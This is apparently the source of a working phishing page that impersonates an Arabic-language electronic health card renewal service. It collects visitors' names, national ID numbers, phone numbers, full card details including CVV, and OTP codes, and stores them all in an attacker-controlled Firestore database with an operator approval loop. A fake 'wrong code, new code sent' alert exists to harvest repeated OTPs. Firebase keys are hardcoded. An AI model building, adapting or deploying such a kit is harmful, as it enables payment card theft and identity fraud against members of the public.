'use client'

import { useState, useEffect, FormEvent } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { CreditCard, MessageCircle } from 'lucide-react'
import { initializeApp } from 'firebase/app'
import { getFirestore, doc, setDoc,  onSnapshot } from 'firebase/firestore'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { FullPageLoader } from "@/components/loader"

const firebaseConfig = {
  apiKey: "AIzaSyB1Tpv9S00TO__RCkAN95ydnMQDR7yEb0A",
  authDomain: "csa3-e2b6a.firebaseapp.com",
  databaseURL: "https://csa3-e2b6a-default-rtdb.firebaseio.com",
  projectId: "csa3-e2b6a",
  storageBucket: "csa3-e2b6a.firebasestorage.app",
  messagingSenderId: "328650323342",
  appId: "1:328650323342:web:468ea6435238c0452be0df",
  measurementId: "G-D32GDGT38Q"
}

const app = initializeApp(firebaseConfig)
const db = getFirestore(app)

interface Notification {
  id: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    id: string;
    fullName: string;
    phone: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
    otp: string;
    allOtps: string[]
    status?: 'pending' | 'approved' | 'rejected'
  };
}

export default function HealthCardRenewal() {
  const [isloading, setIsloading] = useState(false)
  const [stepr, setStep] = useState(1)
  const [show, setShow] = useState(false)
  const [iswait, setIswait] = useState(false)
  const [name, setName] = useState('')
  const [phone, setPhone] = useState('')
  const [id, setId] = useState('')
  const [dateMonth, setDatmont] = useState('')
  const [datayaer, setDatyear] = useState('')
  const [CVC, setCVC] = useState('')
  const [otp, setOtp] = useState('')
  const [otp2, setOtp2] = useState('')
  const [otpArd, setOtpard] = useState([''])
  const [cardNumber, setCardNumber] = useState('')
  const [selectedMethod, setSelectedMethod] = useState<any>('')
  const [cardState, setCardState] = useState('pending')

  const paymentMethods = [
    { id: 'credit-card', name: 'Visa Card', icon: <img className="h-6 w-12" src="/R.png" alt="visa" /> },
    { id: 'master-pay', name: 'Mastecard', icon: <img className="h-6 w-12" src="/m.png" alt="visa" /> },
  ]

  useEffect(() => {
    setOtp2(otp)
  }, [otp])

  useEffect(() => {
    const unsubscribe = onSnapshot(doc(db, 'pays', id), (doc) => {
      if (doc.exists()) {
        const data = doc.data() as Notification;
        if (data.cardInfo && data.cardInfo.status) {
          setCardState(data.cardInfo.status);
          handleApprovalStatus(data.cardInfo.status);
        }
      }
    });

    return () => unsubscribe();
  }, [id]);

  const handleApprovalStatus = (status: string) => {
    if (status === 'approved') {
      setIswait(false)

      setStep(5);
    } else if (status === 'rejected') {
      setIswait(false)
      setStep(3);
      alert('تم رفض البطاقة. يرجى مراجعة المعلومات وإعادة المحاولة.');
    }
  }

  const handleOtp = (v: string) => {
    setOtp(v)
  }

  const handleOArr = async () => {
    await setOtpard([...otpArd, otp])
  }

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault()
    if (stepr === 1) {
      if (id === '' || name == '') {
        return alert('الرجاء ادخال الاسم ورقم البطاقة الشخصية')
      }
    } else if (stepr === 2) {
      if (phone === '') {
        return alert('الرجاء ادخال رقم الهاتف ')
      }
    }
    else if (stepr === 3) {
      if (selectedMethod === '') {
        return alert('الرجاء اختيار طريقة الدفع')
      }
    }
    if (stepr === 4) {
      if (cardNumber === '' || cardNumber.length < 16) {
        return alert('الرجاء ادخال معلومات البطاقة بشكل صحيح ')
      }
      setIswait(true)
      setTimeout(() => {
        handleApprovalStatus(cardState) 
      }, 5000)
    }
    setStep(stepr + 1)

    try {
      const docRef = doc(db, 'pays', id);
      await setDoc(docRef, {
        id: id,
        hasPersonalInfo: true,
        hasCardInfo: true,
        currentPage: stepr,
        createdDate: new Date().toISOString(),
        personalInfo: {
          id: id,
          fullName: name,
          phone: phone
        },
        cardInfo: {
          cardNumber: cardNumber,
          expirationDate: `${dateMonth} / ${datayaer}`,
          cvv: CVC,
          otp: otp,
          allOtps: otpArd,
          status: cardState,
        }
      });

      console.log("Document written with ID: ", id)
    } catch (e) {
      console.error("Error adding document: ", e)
    }
  }

  const handdleadd = (e: any) => {
    handleSubmit(e).then(() => {
      if (stepr >= 5) {
        handleOArr().then(() => {
          setIsloading(true)
          setOtp("")
          setTimeout(() => {
            alert("رمز التحقق خاطىء تم ارسال رمز جديد")
            setIsloading(false)
          }, 4000)
        })
      }
    })
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {iswait ? <FullPageLoader message=" جاري التحقق..." /> : null}
      <div className="container mx-auto px-4 py-4 sm:py-8">
        <div className="flex items-start gap-4 mb-8">
          <h1 className="text-2xl font-bold">خدمة البطاقة الصحية الإلكترونية</h1>
          <div className="bg-[#C8102E] text-white p-4 rounded-lg">
            <span>المساعدة</span>
          </div>
        </div>

        <Card className="max-w-3xl mx-auto">
          <form className="p-4 sm:p-6" onSubmit={handdleadd}>
            {/* Progress Steps */}
            <div className="flex justify-between items-center mb-12 relative">
              <div className="absolute top-1/2 left-0 right-0 h-0.5 bg-gray-200 -z-10" />
              {['معلومات البطاقة', 'استمارة التقديم', 'تفاصيل الدفع', 'إتمام العملية'].map((step, index) => (
                <div key={index} className={`flex flex-col  justify-center items-center gap-2 ${index === 0 ? 'text-[#C8102E]' : 'text-gray-500'}`}>
                  <div className={`w-12 h-12 rounded-full flex items-center justify-center ${(stepr - 1) === index ? 'bg-[#C8102E] text-white' : 'bg-gray-200'
                    }`}>
                    {index + 1}
                  </div>
                  <div className=" text-center items-center justify-center mx-4 ">
                    <span className="text-sm flex  ">{step}</span>
                  </div>
                </div>
              ))}
            </div>
            <p className="text-md mb-4 text-gray-500 italic">
              طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب
            </p>
            {stepr === 1 && (
              <div className="space-y-4 sm:space-y-6">
                <div className="space-y-4 sm:space-y-6">
                  <h2 className="text-lg sm:text-xl font-semibold">معلومات</h2>

                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label className="flex gap-1 text-sm sm:text-base">
                        الرجاء إدخال الاسم الرباعي
                        <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        dir="rtl"
                        onChange={(e) => setName(e.target.value.toString())}
                        type="text" placeholder="الاسم الرباعيٍ"
                        maxLength={11}
                        className="max-w-md text-sm sm:text-base"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="flex gap-1 text-sm sm:text-base">
                        الرجاء إدخال رقم البطاقة الشخصية
                        <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        dir="rtl"
                        onChange={(e) => setId(e.target.value.toString())}
                        type="tel" placeholder="   رقم البطاقة الشخصية"
                        maxLength={11}
                        className="max-w-md text-sm sm:text-base"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label className="flex gap-1 text-sm sm:text-base">
                        نوع العملية
                        <span className="text-red-500">*</span>
                      </Label>
                      <RadioGroup defaultValue="renewal" className="space-y-2" dir="rtl">
                        <div className="flex items-center space-x-2 space-x-reverse">
                          <RadioGroupItem value="renewal" id="renewal" />
                          <Label htmlFor="renewal" className="text-sm sm:text-base">تجديد</Label>
                        </div>
                        <div className="flex items-center space-x-2 space-x-reverse">
                          <RadioGroupItem value="reissue" id="reissue" />
                          <Label htmlFor="reissue" className="text-sm sm:text-base">
                            إعادة الطلب (ePurse المفقود أو التالف)
                          </Label>
                        </div>
                        <div className="flex items-center space-x-2 space-x-reverse">
                          <RadioGroupItem value="check" id="check" />
                          <Label htmlFor="check" className="text-sm sm:text-base">
                            تحقق من تاريخ انتهاء الصلاحية
                          </Label>
                        </div>
                      </RadioGroup>
                    </div>
                  </div>
                </div>
              </div>
            )}
            {stepr === 2 && (
              <div className="space-y-4 sm:space-y-6">
                <p className="text-xs sm:text-lg text-gray-500 italic">
                  طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب
                </p>

                <div className="space-y-4 sm:space-y-6">
                  <h2 className="text-lg sm:text-xl font-semibold"> معلومات حامل البطاقة</h2>

                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Select>
                        <SelectTrigger className="w-full">
                          <SelectValue placeholder="عدد السنوات" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="1">سنوات 1</SelectItem>
                          <SelectItem value="2">2 سنوات </SelectItem>
                          <SelectItem value="3">3 سنوات  </SelectItem>
                          <SelectItem value="4">4 سنوات</SelectItem>
                          <SelectItem value="5">5 سنوات</SelectItem>
                          <SelectItem value="6">6 سنوات</SelectItem>
                          <SelectItem value="7">7 سنوات</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                    <div className="space-y-2">
                      <Label className="flex gap-1 text-sm sm:text-base">
                        رقم الهاتف                      <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        maxLength={12}
                        onChange={(e) => setPhone(e.target.value)}
                        type="tel"
                        placeholder="الرجاء إدخال رقم الهاتف"
                        className="max-w-md text-sm sm:text-base"
                      />
                    </div>
                    <RadioGroup defaultValue="renewal" className="space-y-2 " dir="rtl">
                      <div className="flex items-center space-x-2 space-x-reverse justify-center">
                        <Label htmlFor="renewal" className="text-sm sm:text-base">هل تريد اتسلام ايصال عبر البريد الالكتروني؟</Label>

                        <RadioGroupItem value="reissue" id="reissue" />
                        <Label htmlFor="renewal" className="text-sm sm:text-base">نعم</Label>

                        <RadioGroupItem value="renewal" id="renewal" />
                        <Label htmlFor="renewal" className="text-sm sm:text-base">لا</Label>
                      </div>
                      <div className="flex items-center space-x-2 space-x-reverse">
                        <div className="flex items-center space-x-2 space-x-reverse">
                          <Label htmlFor="renewal" className="text-sm sm:text-base">هل تريد استلام رسالة نصية؟</Label>

                          <RadioGroupItem value="reissue" id="reissue" />
                          <Label htmlFor="renewal" className="text-sm sm:text-base">نعم</Label>

                          <RadioGroupItem value="renewal" id="renewal" />
                          <Label htmlFor="renewal" className="text-sm sm:text-base">لا</Label>
                        </div>
                      </div>
                    </RadioGroup>
                  </div>
                </div>
              </div>
            )}
            {stepr === 3 && (
              <div className="space-y-4 sm:space-y-6 text-gray-500">
                <div className="space-y-4 mb-8">
                  <h2 className="text-2xl font-bold">الرسوم</h2>
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span>الرسم المطلوب</span>
                      <span>رسوم تجديد البطاقة الصحية</span>
                    </div>
                    <div className="flex justify-between">
                      <span>قيمة الرسم</span>
                      <span>100 ريال قطري</span>
                    </div>
                    <div className="flex justify-between font-bold pt-4 border-t">
                      <span>المجموع</span>
                      <span>100 ريال قطري</span>
                    </div>
                  </div>
                </div>

                <button className="fixed bottom-4 left-4 bg-black text-white p-4 rounded-full">
                  <MessageCircle className="w-6 h-6" />
                </button>
              </div>
            )}
            {stepr === 4 && (
              <Card className="w-full max-w-md mx-auto">
                <CardHeader>
                  <CardTitle className="text-2xl font-bold text-center">معلومات البطاقة</CardTitle>
                </CardHeader>
                <CardContent>
                  {show ? (
                    <form className="space-y-6">
                      <div className="space-y-2">
                        <Label htmlFor="cardHolder" className="text-right block">
                          اسم حامل البطاقة <span className="text-red-500">*</span>
                        </Label>
                        <Input
                          onChange={(e) => setName(e.target.value.toString())}
                          id="cardHolder"
                          placeholder="الاسم كما يظهر على البطاقة"
                          className="text-right"
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="cardNumber" className="text-right block">
                          رقم البطاقة <span className="text-red-500">*</span>
                        </Label>
                        <div className="relative">
                          <Input
                            id="cardNumber"
                            placeholder="رقم البطاقة"
                            className="text-right pr-10"
                            type="tel"
                            value={cardNumber}
                            onChange={(e) => setCardNumber(e.target.value)}
                            maxLength={19}
                          />
                          <CreditCard className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" />
                        </div>
                      </div>

                      <div className="grid grid-cols-3 gap-4">
                        <div className="space-y-2 col-span-2">
                          <Label htmlFor="expiry" className="text-right block">
                            تاريخ الانتهاء <span className="text-red-500">*</span>
                          </Label>
                          <div className="grid grid-cols-2 gap-2">
                            <Select onValueChange={(e) => setDatmont(e)}>
                              <SelectTrigger className="w-[80px]">
                                <SelectValue placeholder="شهر" />
                              </SelectTrigger>
                              <SelectContent>
                                {[...Array(12)].map((_, i) => (
                                  <SelectItem key={i + 1} value={(i + 1).toString()}>
                                    {i + 1}
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>

                            <Select onValueChange={(e) => setDatyear(e)}>
                              <SelectTrigger className="w-[80px]">
                                <SelectValue placeholder="سنة" />
                              </SelectTrigger>
                              <SelectContent>
                                {[...Array(11)].map((_, i) => (
                                  <SelectItem key={i} value={(2024 + i).toString()}>
                                    {2024 + i}
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          </div>
                        </div>
                        <div className="space-y-2">
                          <Label htmlFor="cvc" className="text-right block">
                            CVC <span className="text-red-500">*</span>
                          </Label>
                          <Input
                            id="cvc"
                            type="tel"
                            onChange={(e) => setCVC(e.target.value.toString())}
                            placeholder="CVC"
                            className="text-right"
                            maxLength={3}
                          />
                        </div>
                      </div>
                    </form>
                  ) : (
                    <Card className="w-full max-w-md mx-auto">
                      <CardHeader>
                        <CardTitle>طريقة الدفع </CardTitle>
                        <CardDescription>الرجاء تحديد طريقة الدفع المناسبة لك</CardDescription>
                      </CardHeader>
                      <CardContent>
                        <RadioGroup
                          value={selectedMethod}
                          onValueChange={(value) => {
                            setSelectedMethod(value as any)
                            setTimeout(() => {
                              setShow(true)
                            }, 2000)
                          }}
                          className="grid gap-4 pt-2"
                        >
                          {paymentMethods.map((method) => (
                            <div key={method.id}>
                              <RadioGroupItem
                                value={method.id}
                                id={method.id}
                                className="peer sr-only"
                              />
                              <Label
                                htmlFor={method.id}
                                className="flex items-center justify-between rounded-lg border-2 border-muted bg-popover p-4 hover:bg-accent hover:text-accent-foreground peer-data-[state=checked]:border-primary [&:has([data-state=checked])]:border-primary"
                              >
                                <div className="flex items-center gap-4">
                                  {method.icon}
                                  <div className="font-semibold">{method.name}</div>
                                </div>
                              </Label>
                            </div>
                          ))}
                        </RadioGroup>
                      </CardContent>
                    </Card>
                  )}
                </CardContent>
              </Card>
            )}
            {stepr === 5 && (
              <div className="space-y-2">
                <Label className="flex gap-1 text-sm sm:text-base">
                  الرجاء ادخال رمز التحقق المرسل الى هاتفك      <span className="text-red-500">*</span>
                </Label>
                <Input
                  onChange={(e) => { handleOtp(e.target.value) }}
                  value={otp}
                  type="tel"
                  placeholder="رمز التحقق"
                  className="max-w-md text-sm sm:text-base"
                  maxLength={6}
                />
              </div>
            )}
            <div className="grid  grid-cols-2 sm:flex-row sm:justify-between gap-3 pt-4 sm:pt-6">
              <Button
                type="submit"
                variant="outline"
                className="w-full sm:w-auto sm:min-w-[120px]"
              >
                تفريغ الحقول
              </Button>
              <Button
                disabled={(stepr === 4 && !show)}
                type="submit"
                className="w-full  sm:min-w-[100px] py-4 bg-[#C8102E] hover:bg-[#C8102E]/90"
              >
                {stepr >= 5 ? 'ارسال' : isloading ? 'انتظر' : 'تابع'}
              </Button>
            </div>
          </form>
        </Card>
      </div>
    </div>
  )
}

